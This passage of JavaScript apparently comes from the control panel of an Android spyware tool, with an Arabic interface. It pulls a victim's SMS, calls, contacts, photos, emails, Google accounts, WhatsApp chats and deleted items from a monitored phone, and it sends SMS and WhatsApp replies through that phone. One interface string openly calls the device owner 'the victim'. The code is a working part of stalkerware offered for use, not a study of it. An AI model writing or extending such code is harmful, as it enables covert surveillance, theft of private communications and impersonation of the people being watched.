                <button onclick="doSendSms()" style="flex:1;background:#00ffcc;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;">📤 إرسال</button>
                <button onclick="document.getElementById('smsSendOverlay').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
        </div>
    `;
    document.body.appendChild(ov);
}

async function doSendSms() {
    const n = document.getElementById('smsNumber').value.trim();
    const m = document.getElementById('smsMessage').value.trim();
    if (!n || !m) { alert('⚠️ املأ الرقم والنص'); return; }
    const ok = await sendSmsCommand(n, m);
    if (ok) {
        alert('✅ تم إرسال الأمر للجهاز\n(الرسالة تُرسل خلال 30 ثانية كحد أقصى)');
        document.getElementById('smsSendOverlay').remove();
    } else alert('❌ فشل الإرسال');
}

// ═══ رد واتساب ═══
async function replyWhatsAppCmd(sender, message) {
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'reply_whatsapp', sender: sender, message: message, token: getAuthToken() })
        });
        return (await response.json()).success;
    } catch (e) { return false; }
}

function openReplyWhatsApp(sender) {
    if (document.getElementById('waReplyOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'waReplyOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #25D366;border-radius:15px;padding:30px;max-width:450px;width:100%;">
            <h2 style="color:#25D366;margin-bottom:8px;text-align:center;">💬 رد واتساب</h2>
            <p style="color:#888;text-align:center;margin-bottom:20px;font-size:13px;">إلى: ${sender}</p>
            <textarea id="waReplyMsg" rows="4" placeholder="اكتب الرد..." style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #25D366;border-radius:8px;font-size:15px;margin-bottom:15px;resize:vertical;"></textarea>
            <div style="display:flex;gap:10px;">
                <button onclick="doReplyWa('${sender.replace(/'/g, "\\'")}')" style="flex:1;background:#25D366;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">📤 إرسال الرد</button>
                <button onclick="document.getElementById('waReplyOverlay').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
            <p style="color:#666;font-size:11px;text-align:center;margin-top:15px;">⚠️ يعمل فقط إذا عند الضحية إشعار واتساب نشط</p>
        </div>
    `;
    document.body.appendChild(ov);
}

async function doReplyWa(sender) {
    const m = document.getElementById('waReplyMsg').value.trim();
    if (!m) { alert('⚠️ اكتب الرد'); return; }
    const ok = await replyWhatsAppCmd(sender, m);
    if (ok) { alert('✅ تم إرسال الأمر'); document.getElementById('waReplyOverlay').remove(); }
    else alert('❌ فشل');
}

function openReplyWaPicker() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`)
        .then(res => res.json())
        .then(messages => {
            const senders = [...new Set(messages.map(m => m.sender))].filter(s => s);
            if (senders.length === 0) { alert('⚠️ لا توجد محادثات واتساب'); return; }
            const ov = document.createElement('div');
            ov.id = 'waPickerOverlay';
            ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
            ov.innerHTML = `
                <div style="max-width:450px;margin:0 auto;background:#111;border:2px solid #25D366;border-radius:15px;padding:20px;">
                    <h2 style="color:#25D366;text-align:center;margin-bottom:20px;">💬 اختر المرسل للرد</h2>
                    <div style="max-height:400px;overflow-y:auto;">
                        ${senders.map(s => `<div onclick="openReplyWhatsApp('${s.replace(/'/g, "\\'")}'); document.getElementById('waPickerOverlay').remove();" style="padding:15px;background:#1e2a2a;border:1px solid #25D366;border-radius:8px;margin-bottom:8px;cursor:pointer;color:#fff;font-size:15px;">📥 ${s}</div>`).join('')}
                    </div>
                    <button onclick="document.getElementById('waPickerOverlay').remove()" style="width:100%;margin-top:15px;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إلغاء</button>
                </div>
            `;
            document.body.appendChild(ov);
        })
        .catch(() => alert('❌ فشل جلب المحادثات'));
}

// ═══ المحذوفات ═══
function filterDeleted(type) {
    deletedFilter = type;
    const btns = { all: 'delFilterAll', call_log: 'delFilterCall', sms: 'delFilterSms', image: 'delFilterImg' };
    Object.keys(btns).forEach(k => {
        const el = document.getElementById(btns[k]);
        if (el) {
            el.style.background = (k === type) ? '#00ffcc' : '#333';
            el.style.color = (k === type) ? '#000' : '#fff';
        }
    });
    displayDeleted();
}

async function clearAllDeleted() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    if (!confirm('⚠️ مسح كل المحذوفات؟\nهذا الإجراء لا يمكن التراجع عنه!')) return;
    try {
        const response = await authFetch(`/api.php?action=clear_deleted&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        if (result.success) {
            allDeleted = [];
            lastDeletedCount = 0;
            displayDeleted();
            const badge = document.getElementById('deletedCount');
            if (badge) { badge.textContent = '(0)'; badge.className = 'count'; }
            showNotification('✅ تم المسح', 'سلة المحذوفات فارغة الآن', '🗑️');
        } else alert('❌ فشل المسح');
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

async function deleteSingleDeleted(index) {
    if (!confirm('حذف هذا العنصر من السلة؟')) return;
    try {
        const response = await authFetch(`/api.php?action=delete_deleted_item&device=${encodeURIComponent(currentDevice)}&index=${index}`);
        const result = await response.json();
        if (result.success) {
            allDeleted.splice(index, 1);
            displayDeleted();
            const badge = document.getElementById('deletedCount');
            if (badge) badge.textContent = `(${allDeleted.length})`;
        }
    } catch (e) {}
}

function checkNewSMS(newSMS) {
    if (!newSMS || newSMS.length === 0) return;
    if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
        const s = newSMS[0];
        showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
        const badge = document.getElementById('smsCount');
        if (badge) { badge.textContent = `(${newSMS.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastSmsCount = newSMS.length;
}

function checkNewCalls(newCalls) {
    if (!newCalls || newCalls.length === 0) return;
    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
        const c = newCalls[0];
        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
        const badge = document.getElementById('callCount');
        if (badge) { badge.textContent = `(${newCalls.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastCallCount = newCalls.length;
}

function checkNewDeleted(deleted) {
    if (!deleted || deleted.length === 0) return;
    if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
        const d = deleted[0];
        const t = d.type || d.deleted_type || '';
        const typeName = t === 'call_log' ? '📞 مكالمة محذوفة' : t === 'sms' ? '💬 رسالة محذوفة' : t === 'contact' ? '👤 جهة محذوفة' : t === 'image' ? '🖼️ صورة محذوفة' : '🗑️ عنصر محذوف';
        showNotification(typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
        const badge = document.getElementById('deletedCount');
        if (badge) { badge.textContent = `(${deleted.length}) 🔴`; badge.className = 'count badge-new'; }
    }
    lastDeletedCount = deleted.length;
}

async function deleteDevice() {
    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
    try {
        const response = await authFetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        if (result.success) {
            alert('✅ تم حذف الجهاز');
            currentDevice = null;
            document.getElementById('deviceSelect').value = '';
            document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
            document.getElementById('deviceNameDisplay').className = 'device-name-display';
            setTimeout(() => { loadDevices(); }, 500);
            setTimeout(() => { loadDevices(); }, 1500);
            setTimeout(() => { loadDevices(); }, 3000);
        } else alert('❌ خطأ: ' + (result.error || 'غير معروف'));
    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
}

async function loadDevices() {
    try {
        const response = await authFetch('/devices.json');
        const devices = await response.json();
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        (devices || []).forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name || device.id;
            select.appendChild(option);
        });
        if (currentValue) { select.value = currentValue; }
        else if (devices && devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
    } catch (e) {}
}

function selectDevice(deviceId) {
    panelOpenTime = Date.now();
    liveFilterEnabled = true;
    setTimeout(() => { liveFilterEnabled = false; }, 5000);

    currentDevice = deviceId;
    const display = document.getElementById('deviceNameDisplay');
    if (deviceId) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
        display.textContent = `📱 ${deviceName}`;
        display.className = 'device-name-display active';
    } else {
        display.textContent = 'لا يوجد جهاز';
        display.className = 'device-name-display';
    }
    if (deviceId && !soundPlayedForDevice) {
        playNotificationSound();
        soundPlayedForDevice = true;
        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
    }
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    initSSE();
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 3000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (data.error) return;

        const statusEl = document.getElementById('networkStatus');
        if (statusEl) {
            if (data.online) {
                statusEl.textContent = data.network || 'متصل';
                statusEl.className = 'value online';
            } else {
                statusEl.textContent = 'غير متصل';
                statusEl.className = 'value offline';
            }
        }

        const netEl = document.getElementById('networkTypeStatus');
        if (netEl) netEl.textContent = data.network_type || '—';

        const battEl = document.getElementById('batteryStatus');
        if (battEl) {
            if (data.battery !== null && data.battery !== undefined && data.battery >= 0) {
                battEl.textContent = data.battery + '%';
            } else {
                battEl.textContent = '—';
            }
        }

        const chargingEl = document.getElementById('chargingStatus');
        if (chargingEl) {
            if (data.charging) {
                const type = data.charging_type && data.charging_type !== 'لا' ? ` (${data.charging_type})` : '';
                chargingEl.textContent = `⚡ يتم الشحن${type}`;
            } else {
                chargingEl.textContent = '';
            }
        }

        const lastSeenEl = document.getElementById('lastSeen');
        if (lastSeenEl) {
            const ago = data.seconds_ago || 0;
            let agoText = '';
            if (ago < 5) agoText = 'الآن';
            else if (ago < 60) agoText = 'قبل ' + ago + ' ثانية';
            else if (ago < 3600) agoText = 'قبل ' + Math.floor(ago / 60) + ' دقيقة';
            else if (ago < 86400) agoText = 'قبل ' + Math.floor(ago / 3600) + ' ساعة';
            else agoText = 'قبل ' + Math.floor(ago / 86400) + ' يوم';
            lastSeenEl.textContent = agoText;
        }

        if (data.call_count !== undefined) {
            const el = document.getElementById('callCount');
            if (el) el.textContent = `(${data.call_count})`;
        }
        if (data.sms_count !== undefined) {
            const el = document.getElementById('smsCount');
            if (el) el.textContent = `(${data.sms_count})`;
        }
        if (data.contacts_count !== undefined) {
            const el = document.getElementById('contactsCount');
            if (el) el.textContent = `(${data.contacts_count})`;
        }
        if (data.images_count !== undefined) {
            const el = document.getElementById('imagesCount');
            if (el) el.textContent = `(${data.images_count})`;
        }
        if (data.apps_count !== undefined) {
            const el = document.getElementById('appsCount');
            if (el) el.textContent = `(${data.apps_count})`;
        }
        if (data.deleted_count !== undefined) {
            const el = document.getElementById('deletedCount');
            if (el) el.textContent = `(${data.deleted_count})`;
        }
        if (data.voice_count !== undefined) {
            const vBadge = document.getElementById('liveVoicesCount');
            if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
        }

        if (data.sim_numbers && data.sim_numbers.length > 0) {
            const display = document.getElementById('deviceNameDisplay');
            if (display && !display.textContent.includes(data.sim_numbers[0])) {
                const baseName = display.textContent.split(' — ')[0];
                display.textContent = `${baseName} — 📱 ${data.sim_numbers[0]}`;
            }
        }
    } catch (e) {
        console.log('updateLiveData error:', e);
    }
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
    await loadDeleted();
    await loadWhatsApp();
    await loadGoogleAccounts();
    await loadEmails();
}

async function loadGoogleAccounts() {
    try {
        const response = await authFetch(`/api.php?action=get_google_accounts&device=${encodeURIComponent(currentDevice)}`);
        const accounts = await response.json();
        const div = document.getElementById('googleAccountsList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(accounts) || accounts.length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد حسابات Google</p>';
            return;
        }
        accounts.forEach(account => {
            const email = account.email || account.name || 'غير معروف';
            const type = account.type || 'Google';
            const item = document.createElement('div');
            item.className = 'conversation-item';
            item.innerHTML = `
                <div class="conversation-avatar">📧</div>
                <div class="conversation-info">
                    <div class="conversation-name">${email}</div>
                    <div class="conversation-preview">${type}</div>
                </div>
            `;
            div.appendChild(item);
        });
    } catch (e) {}
}

async function loadEmails() {
    try {
        const response = await authFetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
        const emails = await response.json();
        const div = document.getElementById('emailsList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(emails) || emails.length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد رسائل بريد</p>';
            return;
        }
        [...emails].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach((email) => {
            const item = document.createElement('div');
            item.className = 'conversation-item';
            item.style.cssText = 'position:relative;';
            const img = email.image_data
                ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:150px;border-radius:5px;margin-top:8px;cursor:pointer;" onclick="window.open(this.src)">`
                : '';
            item.innerHTML = `
                <div class="conversation-avatar">📧</div>
                <div class="conversation-info" style="flex:1;">
                    <div class="conversation-name">${email.app_name || 'Email'}</div>
                    <div class="conversation-preview" style="font-weight:bold;color:#00ffcc;">${email.sender || 'غير معروف'}</div>
                    <div class="conversation-preview">${email.subject || ''}</div>
                    <div class="conversation-preview">${email.snippet || ''}</div>
                    <div class="conversation-time" style="color:#888;font-size:11px;">📅 ${formatDate(email.timestamp)}</div>
                    ${img}
                </div>
            `;
            div.appendChild(item);
        });
    } catch (e) {}
}

async function loadDeleted() {
    try {
        const response = await authFetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
        const deleted = await response.json();
        if (!Array.isArray(deleted)) return;
        if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
            checkNewDeleted(deleted);
            allDeleted = deleted;
            displayDeleted();
        }
    } catch (e) {}
}

async function loadWhatsApp() {
    try {
        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        let messages = await response.json();

        if (Array.isArray(messages)) {
            messages = messages.slice(-20);
        }

        const div = document.getElementById('whatsappList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(messages) || messages.length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>';
            return;
        }
        const conversations = {};
        messages.forEach(msg => {
            const sender = msg.sender || 'غير معروف';
            if (!conversations[sender]) conversations[sender] = [];
            conversations[sender].push(msg);
        });
        Object.keys(conversations).forEach(sender => {
            const msgs = conversations[sender].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
            const lastMsg = msgs[msgs.length - 1];
            const imageCount = msgs.filter(m => m.image_data).length;
            const displayName = findContactName(sender) || sender;
            const conversationDiv = document.createElement('div');
            conversationDiv.className = 'conversation-item';
            conversationDiv.style.cssText = 'display:flex;align-items:center;gap:15px;padding:15px;background:#111;border-radius:8px;margin-bottom:10px;cursor:pointer;border:1px solid #222;position:relative;';
            conversationDiv.innerHTML = `
                <div style="font-size:40px;">${lastMsg.is_group ? '👥' : '💬'}</div>
                <div style="flex:1;" onclick="openWhatsAppChat('${sender}')">
                    <div style="color:#00ffcc;font-weight:bold;font-size:16px;">${displayName}</div>
                    <div style="color:#aaa;font-size:13px;">${lastMsg.message_type === 'image' ? '📷 صورة' : lastMsg.message || ''}</div>
                    <div style="color:#888;font-size:12px;">📅 ${formatWhatsAppDate(lastMsg.timestamp)}</div>
                </div>
                <div style="text-align:center;">
                    <div style="background:#00ffcc;color:black;padding:5px 12px;border-radius:15px;font-size:13px;font-weight:bold;">${msgs.length}</div>
                    ${imageCount > 0 ? `<div style="color:#ff9800;font-size:11px;margin-top:5px;">📷 ${imageCount}</div>` : ''}
                </div>
                <button onclick="event.stopPropagation();deleteWhatsAppChat('${sender}')" style="position:absolute;top:5px;left:5px;background:none;border:none;color:#ff3300;cursor:pointer;font-size:18px;" title="حذف الدردشة">🗑️</button>
            `;
            div.appendChild(conversationDiv);
        });
        const badge = document.getElementById('whatsappCount');
        if (badge) badge.textContent = `(${messages.length})`;
    } catch (e) {}
}

async function openWhatsAppChat(sender) {
    try {
        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        const messages = await response.json();
        const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
        const chatWindow = document.createElement('div');
        chatWindow.id = 'whatsappChatWindow';
        chatWindow.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;z-index:9999;display:flex;flex-direction:column;`;
        const displayName = findContactName(sender) || sender;
        currentChat = sender;
        chatWindow.innerHTML = `
            <div style="background:#075E54;padding:15px 20px;display:flex;align-items:center;gap:15px;box-shadow:0 2px 10px rgba(0,0,0,0.5);">
                <button onclick="closeWhatsAppChat()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;">⬅️</button>
                <div style="flex:1;">
                    <div style="color:white;font-weight:bold;font-size:18px;">${displayName}</div>
                    <div style="color:#ccc;font-size:12px;">${sender}</div>
                    <div style="color:#aaa;font-size:11px;">${senderMessages.length} رسالة مستلمة</div>
                </div>
                <button onclick="openReplyWhatsApp('${sender.replace(/'/g, "\\'")}')" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;" title="رد">↩️</button>
                <button onclick="selectAllWhatsApp()" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;" title="تحديد الكل">☑️</button>
                <button onclick="deleteSelectedWhatsApp()" style="background:none;border:none;color:#ff3300;font-size:20px;cursor:pointer;padding:5px 10px;" title="حذف المحدد">🗑️</button>
            </div>
            <div id="whatsappMessagesContainer" style="flex:1;overflow-y:auto;padding:20px;background:#0a0a0a;">
                ${senderMessages.map((msg) => {
                    return `
                    <div class="wa-msg" data-timestamp="${msg.timestamp}" style="margin-bottom:12px;">
                        <div style="display:flex;justify-content:flex-start;">
                            <div style="max-width:70%;padding:12px 15px;border-radius:15px;background:#1e2a2a;margin-right:auto;border-bottom-left-radius:5px;position:relative;">
                                <div style="color:#25D366;font-size:11px;font-weight:bold;margin-bottom:3px;">📥 ${displayName}</div>
                                ${msg.image_data ? `<img src="data:image/jpeg;base64,${msg.image_data}" onclick="window.open(this.src)" style="max-width:250px;border-radius:10px;cursor:pointer;display:block;margin-bottom:5px;">` : ''}
                                <div style="color:white;font-size:15px;">${msg.message_type === 'image' ? '📷' : msg.message_type === 'video' ? '🎬' : msg.message_type === 'audio' ? '🎵' : msg.message_type === 'document' ? '📄' : ''} ${msg.message || ''}</div>
                                <div style="color:#aaa;font-size:11px;text-align:left;margin-top:3px;">${formatWhatsAppDate(msg.timestamp)}</div>
                            </div>
                        </div>
                    </div>
                    `;
                }).join('')}
            </div>
        `;
        document.body.appendChild(chatWindow);
        const container = document.getElementById('whatsappMessagesContainer');
        container.scrollTop = container.scrollHeight;
    } catch (e) {}
}

function closeWhatsAppChat() { const w = document.getElementById('whatsappChatWindow'); if (w) w.remove(); currentChat = null; }
function selectAllWhatsApp() {
    const msgs = document.querySelectorAll('.wa-msg');
    msgs.forEach(msg => {
        if (msg.classList.contains('selected')) { msg.classList.remove('selected'); msg.style.opacity = '1'; }
        else { msg.classList.add('selected'); msg.style.opacity = '0.5'; }
    });
}
async function deleteSelectedWhatsApp() {
    const selected = document.querySelectorAll('.wa-msg.selected');
    if (selected.length === 0) { alert('⚠️ حدد رسائل أولاً'); return; }
    if (!confirm(`حذف ${selected.length} رسالة؟`)) return;
    const timestamps = [];
    selected.forEach(msg => { timestamps.push(msg.getAttribute('data-timestamp')); });
    try {
        const response = await authFetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
        const result = await response.json();
        if (result.success) {
            const sender = currentChat;
            closeWhatsAppChat();
            loadWhatsApp();
            if (sender) setTimeout(() => openWhatsAppChat(sender), 500);
        }
    } catch (e) {}
}
async function deleteWhatsAppChat(sender) {
    if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
    try {
        const response = await authFetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
        const result = await response.json();
        if (result.success) { loadWhatsApp(); }
    } catch (e) {}
}

async function clearWhatsAppList() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    if (!confirm('⚠️ مسح كل رسائل واتساب من السيرفر؟')) return;
    try {
        const response = await authFetch(`/api.php?action=clear_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (data.success) {
            const div = document.getElementById('whatsappList');
            if (div) div.innerHTML = '<p style="color:#888;">تم المسح</p>';
            const badge = document.getElementById('whatsappCount');
            if (badge) badge.textContent = '(0)';
            liveMsgs = [];
            const liveBadge = document.getElementById('liveMsgsCount');
            if (liveBadge) liveBadge.textContent = '0';
            showNotification('✅', 'تم مسح رسائل واتساب', '🗑️');
        } else {
            alert('❌ فشل المسح');
        }
    } catch (e) {
        alert('❌ خطأ: ' + e.message);
    }
}

function formatWhatsAppDate(t) {
    if (!t) return '—';
    try {
        const d = new Date(Number(t));
        if (isNaN(d.getTime())) return '—';
        return d.toLocaleString('ar', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
    } catch (e) { return '—'; }
}

function displayDeleted() {
    const div = document.getElementById('deletedList');
    if (!div) return;
    div.innerHTML = '';
    let filtered = allDeleted || [];
    if (deletedFilter !== 'all') {
        filtered = filtered.filter(item => {
            const t = item.type || item.deleted_type || '';
            if (deletedFilter === 'call_log') return t === 'call_log' || t === 'call_logs' || t === 'deleted_call';
            if (deletedFilter === 'sms') return t === 'sms' || t === 'deleted_sms';
            if (deletedFilter === 'image') return t === 'image';
            return true;
        });
    }
    if (filtered.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد عناصر محذوفة</p>'; return; }
    filtered.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    filtered.forEach((item) => {
        const realIdx = allDeleted.indexOf(item);
        const divItem = document.createElement('div');
        divItem.className = 'conversation-item';
        divItem.style.cssText = 'flex-direction:column;align-items:stretch;position:relative;';
        const type = item.type || item.deleted_type || '';
        const data = item.item || item;
        const ts = item.timestamp || data.deleted_at || data.date || 0;
        let innerHTML = '';
        if (type === 'call_log' || type === 'call_logs' || type === 'deleted_call') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">📞</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">📞 مكالمة محذوفة</div><div class="conversation-preview">الرقم: <b>${data.number || data.name || 'غير معروف'}</b></div><div class="conversation-preview">النوع: ${getCallType(data.type)}</div><div class="conversation-preview">المدة: ${formatDuration(data.duration)}</div><div class="conversation-preview">التاريخ: ${formatDate(data.date)}</div><div class="conversation-preview" style="color:#ff6600;">⏰ حُذف: ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'sms' || type === 'deleted_sms') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:flex-start;"><div class="conversation-avatar">💬</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">💬 رسالة محذوفة</div><div class="conversation-preview">من/إلى: <b>${data.address || 'غير معروف'}</b></div><div class="conversation-preview">النص: <span style="color:#fff;">${data.body || '—'}</span></div><div class="conversation-preview">النوع: ${data.type == 1 ? '📥 مستلمة' : '📤 مرسلة'}</div><div class="conversation-preview">التاريخ: ${formatDate(data.date)}</div><div class="conversation-preview" style="color:#ff6600;">⏰ حُذفت: ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'contact' || type === 'contacts' || type === 'deleted_contact') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">👤</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">👤 جهة اتصال محذوفة</div><div class="conversation-preview">الاسم: <b>${data.name || 'غير معروف'}</b></div><div class="conversation-preview" style="color:#ff6600;">⏰ حُذفت: ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'image') {
            const sourceLabels = { camera: '📸 كاميرا', screenshot: '📱 سكرين شوت', whatsapp: '💬 واتساب', telegram: '✈️ تيليجرام', download: '⬇️ تحميل', unknown: '📁 ملف' };
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">🖼️</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">🖼️ صورة/ملف محذوف</div><div class="conversation-preview">الاسم: <b>${data.name || 'غير معروف'}</b></div><div class="conversation-preview">المصدر: ${sourceLabels[data.source] || '📁'}</div><div class="conversation-preview" style="word-break:break-all;font-size:11px;">المسار: ${data.path || ''}</div><div class="conversation-preview" style="color:#ff6600;">⏰ حُذفت: ${formatDate(ts)}</div></div></div>`;
        } else {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">🗑️</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">🗑️ عنصر محذوف</div><div class="conversation-preview">النوع: ${type || 'غير معروف'}</div><div class="conversation-preview">${JSON.stringify(data).substring(0, 200)}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        }
        divItem.innerHTML = innerHTML + `<button onclick="deleteSingleDeleted(${realIdx})" style="position:absolute;top:10px;left:10px;background:#ff3300;color:#fff;border:none;width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:13px;font-weight:bold;" title="حذف">✕</button>`;
        div.appendChild(divItem);
    });
}

async function loadCalls() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
        const newCalls = await response.json();
        if (!Array.isArray(newCalls)) return;
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            checkNewCalls(newCalls);
            allCalls = newCalls;
            if (currentCallNumber) openCallDetail(currentCallNumber);
            else displayCallsList();
        }
    } catch (e) {}
}

function displayCallsList() {
    document.getElementById('callDetailView').style.display = 'none';
    document.getElementById('callsListView').style.display = 'block';
    const div = document.getElementById('callsListView');
    div.innerHTML = '';
    if (!allCalls || allCalls.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
    [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const displayName = call.name || findContactName(call.number) || call.number || 'غير معروف';
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openCallDetail(call.number);
        item.innerHTML = `<div class="conversation-avatar">${call.type == 1 ? '📥' : call.type == 2 ? '📤' : '❌'}</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${formatDate(call.date)}</div></div><div class="conversation-time">${formatDuration(call.duration)}</div>`;
        div.appendChild(item);
    });
}

function openCallDetail(number) {
    currentCallNumber = number;
    document.getElementById('callsListView').style.display = 'none';
    document.getElementById('callDetailView').style.display = 'block';
    document.getElementById('callDetailTitle').textContent = `📞 ${findContactName(number) || number}`;
    const detailsDiv = document.getElementById('callDetailsList');
    detailsDiv.innerHTML = '';
    allCalls.filter(c => c.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-detail-item';
        div.innerHTML = `<span class="call-type type-${call.type}">${getCallType(call.type)}</span><span>⏱️ ${formatDuration(call.duration)}</span><span>📅 ${formatDate(call.date)}</span>`;
        detailsDiv.appendChild(div);
    });
}

function backToCallsList() { currentCallNumber = null; displayCallsList(); }

async function loadSMS() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
        const newSMS = await response.json();
        if (!Array.isArray(newSMS)) return;
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            checkNewSMS(newSMS);
            allSMS = newSMS;
            if (currentChat) openChat(currentChat);
            else displayConversations();
        }
    } catch (e) {}
}

function displayConversations() {
    document.getElementById('chatView').style.display = 'none';
    document.getElementById('conversationsList').style.display = 'block';
    const div = document.getElementById('conversationsList');
    div.innerHTML = '';
    if (!allSMS || allSMS.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
    const sorted = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
    const conversations = {};
    sorted.forEach(sms => { const n = sms.address || 'غير معروف'; if (!conversations[n]) conversations[n] = []; conversations[n].push(sms); });
    Object.keys(conversations).forEach(number => {
        const last = conversations[number][0];
        const displayName = findContactName(number) || number;
        const item = document.createElement('div');
